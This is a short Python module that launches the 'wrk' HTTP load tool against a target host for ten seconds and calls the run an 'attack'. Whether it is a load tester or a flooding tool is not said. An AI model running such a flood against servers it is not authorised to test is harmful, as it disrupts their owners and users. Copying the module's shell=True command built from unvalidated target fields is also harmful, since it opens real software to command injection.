from typing import Tuple, Callable, Coroutine, Any

import os
import sys
import subprocess
import asyncio

from models import Target


ATTACK_DURATION = 10


async def _run_workload(target: Target, connections: int = 100, duration: int = 60):
    return subprocess.Popen(f"exec wrk -c {connections} -d {duration} -t 8 {target.protocol}://{target.host}",
                            shell=True,
                            stdout=open(os.devnull, 'w'),
                            stderr=sys.stderr
                            )


async def _is_attack_running(pipe) -> bool:
    if pipe.poll() is not None:
        return False
    return True


async def _create_attack(target: Target):
    global ATTACK_DURATION

    pipe = await _run_workload(target, duration=ATTACK_DURATION)

    try:
        while True:
            if not await _is_attack_running(pipe):
                return
            await asyncio.sleep(0.1)

    finally:
        if await _is_attack_running(pipe):
            pipe.kill()


async def start_attack(target: Target) -> asyncio.Task:
    """Starts the attack, and returns the asyncio.Task of the running process"""
    return asyncio.create_task(_create_attack(target))


